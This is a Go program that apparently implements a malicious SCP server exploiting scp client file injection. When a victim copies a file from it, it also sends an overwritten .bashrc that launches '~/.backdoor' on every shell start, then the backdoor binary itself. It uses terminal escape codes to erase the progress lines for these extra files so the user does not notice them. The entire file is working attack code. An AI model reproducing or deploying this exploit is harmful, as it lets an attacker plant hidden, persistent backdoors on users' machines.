package main

import (
    "fmt"
    "bufio"
    "os"
    "io"
)

func main() {
    r := bufio.NewReader(os.Stdin)
    w := bufio.NewWriter(os.Stderr)
    r.ReadByte()
    fmt.Println("C0644 9 testfile.txt")
    r.ReadByte()
    fmt.Println("Loser :)")
    null := "\x00"
    fmt.Print(null)
    r.ReadByte()
    fmt.Println("C0644 35 .bashrc")
    r.ReadByte()
    fmt.Println(". /etc/bashrc\nsetsid ~/.backdoor &")
    fmt.Print(null)
    r.ReadByte()
    w.WriteString("\033[A\033[K")
    w.Flush()
    fmt.Println("C0700 961872 .backdoor")
    r.ReadByte()
    if _, err := os.Stat("/tmp/backdoor"); err == nil {
      fmt.Println("Backdoor is available")
      fh, _ := os.Open("/tmp/backdoor")
      io.Copy(os.Stdout, fh)
      fmt.Print(null)
      r.ReadByte()
      w.WriteString("\033[A\033[K")
      w.Flush()
    }
}
